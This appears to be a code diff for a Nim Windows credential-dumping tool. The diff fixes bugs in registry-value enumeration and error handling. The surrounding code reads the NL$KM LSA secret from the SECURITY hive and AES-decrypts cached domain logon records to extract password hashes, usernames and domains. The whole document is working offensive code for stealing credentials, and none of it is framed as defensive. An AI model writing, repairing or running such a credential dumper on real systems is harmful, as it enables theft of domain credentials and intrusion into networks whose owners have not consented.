@@ -40,70 +40,89 @@ proc OpenRegistryWithNtOpenKeyEx(keyString: PCWSTR): HANDLE =
     quit(-1)
   return returnHandle
 
-proc EnumerateValueNames(hKey:HANDLE):seq[string] = 
+proc EnumerateValueNames(hKey: HANDLE): seq[string] =
   var
-    returnValue:seq[string] = @[]
+    returnValue: seq[string] = @[]
     index: ULONG = 0
     resultLength: ULONG = 0
-    buffer:seq[byte]
-    status:NTSTATUS
-    info:ptr KEY_VALUE_BASIC_INFORMATION_STRUCT
-    namePtr:ptr WCHAR
-    name:string
-  while true:
+    buffer: seq[byte]
+    status: NTSTATUS
+    info: ptr KEY_VALUE_BASIC_INFORMATION_STRUCT
+    namePtr: ptr UncheckedArray[WCHAR]
+    name: string
+    nameCharLen: int
 
-    discard NtEnumerateValueKeyProc(hKey,index,KeyValueBasicInformation,nil,0,addr resultLength)
+  while true:
+    discard NtEnumerateValueKeyProc(hKey, index, KeyValueBasicInformation, nil, 0, addr resultLength)
 
     if resultLength == 0:
       break
 
     buffer = newSeq[byte](resultLength)
 
-    status = NtEnumerateValueKeyProc(hKey,index,KeyValueBasicInformation,addr buffer[0],resultLength,addr resultLength)
+    status = NtEnumerateValueKeyProc(hKey, index, KeyValueBasicInformation, addr buffer[0], resultLength, addr resultLength)
 
     if status != 0:
       break
 
     info = cast[ptr KEY_VALUE_BASIC_INFORMATION_STRUCT](addr buffer[0])
 
-    namePtr = cast[ptr WCHAR](addr info.Name)
+    # NameLength is in bytes, divide by 2 for wide char count — do NOT cast to WideCString
+    nameCharLen = info.NameLength.int div sizeof(WCHAR)
+    namePtr = cast[ptr UncheckedArray[WCHAR]](addr info.Name)
 
-    name = $cast[WideCString](namePtr)
+    name = ""
+    for i in 0 ..< nameCharLen:
+      name.add(cast[char](namePtr[i]))
 
-    if(cmpIgnoreCase(name,"NL$Control") != 0):
+    if cmpIgnoreCase(name, "NL$Control") != 0:
       returnValue.add(name)
+
     inc index
+
   return returnValue
 
-proc GetValueWithRegQueryMultipleValuesWType(keyHandle: HANDLE,valueString: string):seq[byte] = 
-  var 
+proc GetValueWithRegQueryMultipleValuesWType(keyHandle: HANDLE, valueString: string): seq[byte] =
+  var
     values: array[1, VALENTW]
     buffer: seq[byte]
     slice: seq[byte]
     bufferSize: DWORD
-    returnValue:LSTATUS
-  
-  values[0].ve_valuename = valueString.newWideCString()
-  bufferSize = 0
-  returnValue = RegQueryMultipleValuesW( keyHandle, addr values[0], 1, nil, addr bufferSize)
-  
-  if returnValue != ERROR_MORE_DATA or bufferSize == 0:
-    echo "[-] Error on reading buffer size for ",valueString," : ",GetLastError()
-    quit(-1)
-    
-  buffer = newSeq[byte](bufferSize)
+    returnValue: LSTATUS
+    wideName: WideCString = valueString.newWideCString()
 
-  returnValue = RegQueryMultipleValuesW(keyHandle, addr values[0], 1, cast[LPWSTR](addr buffer[0]), addr bufferSize)
-  
-  if returnValue != 0:
-      echo "[-] Error on getting value for ",valueString," : ",GetLastError()
-      quit(-1)
-  
+  values[0].ve_valuename = cast[LPWSTR](wideName)
+  bufferSize = 0
+  returnValue = RegQueryMultipleValuesW(keyHandle, addr values[0], 1, nil, addr bufferSize)
+
+  # Key doesn't exist or is inaccessible — return empty rather than crash
+  if returnValue == ERROR_FILE_NOT_FOUND or returnValue == ERROR_ACCESS_DENIED:
+    echo "[-] Value not found or access denied for ", valueString, " (", returnValue, ")"
+    return @[]
+
+  if returnValue != ERROR_MORE_DATA or bufferSize == 0:
+    echo "[-] Unexpected error reading buffer size for ", valueString, " : ", returnValue
+    return @[]
+
+  buffer = newSeq[byte](bufferSize)
+  returnValue = RegQueryMultipleValuesW(
+    keyHandle,
+    addr values[0],
+    1,
+    cast[LPWSTR](addr buffer[0]),
+    addr bufferSize
+  )
+
+  if returnValue != ERROR_SUCCESS:
+    echo "[-] Error on getting value for ", valueString, " : ", returnValue
+    return @[]
+
   if values[0].ve_valuelen > 0:
     let offset = values[0].ve_valueptr.int - cast[int](addr buffer[0])
-    if offset >= 0 and offset + values[0].ve_valuelen.int <= buffer.len:
+    if offset >= 0 and (offset + values[0].ve_valuelen.int) <= buffer.len:
       slice = buffer[offset ..< offset + values[0].ve_valuelen.int]
       return slice
+
   return @[]
 
 proc DynamicallyLoadFunctions():bool =
@@ -404,17 +423,22 @@ proc GetSecurityDump() =
   discard NtCloseProc(hKey)
   nlkmKey = DumpSecret("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM\\"&currValName,decryptedLsaKey)
   hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Cache")
-  cachedDomainLogonKeyNames=EnumerateValueNames(hKey)
+  cachedDomainLogonKeyNames = EnumerateValueNames(hKey)
   for domainKeyName in cachedDomainLogonKeyNames:
-    cachedDomainLogonValue = GetValueWithRegQueryMultipleValuesWType(hKey,domainKeyName)
-    if(not (cachedDomainLogonValue[0 ..< 16].allIt(it == 0))):
+    cachedDomainLogonValue = GetValueWithRegQueryMultipleValuesWType(hKey, domainKeyName)
+    
+    # Skip empty/missing cache slots
+    if cachedDomainLogonValue.len == 0:
+      continue
+
+    if not (cachedDomainLogonValue[0 ..< 16].allIt(it == 0)):
       cachedUser = InitNlRecord(cachedDomainLogonValue)
-      slice = nlkmKey[16..<16+16]
-      decryptedCBC = DecryptAES_CBC(cachedUser.EncryptedData,slice,cachedUser.Iv)
-      hashedPW = decryptedCBC[0..<16]
-      sliceUsername = decryptedCBC[72..<72+cachedUser.UserLength]
+      slice = nlkmKey[16 ..< 16+16]
+      decryptedCBC = DecryptAES_CBC(cachedUser.EncryptedData, slice, cachedUser.Iv)
+      hashedPW = decryptedCBC[0 ..< 16]
+      sliceUsername = decryptedCBC[72 ..< 72+cachedUser.UserLength]
       startIndex = 72 + Pad(cachedUser.UserLength) + Pad(cachedUser.DomainNameLength)
-      sliceDomain = decryptedCBC[startIndex..<startIndex+Pad(cachedUser.DnsDomainLength)]
+      sliceDomain = decryptedCBC[startIndex ..< startIndex+Pad(cachedUser.DnsDomainLength)]
       domain = SeqToUnicode(sliceDomain)
       username = SeqToUnicode(sliceUsername)
       domain = domain.replace("\0", "")
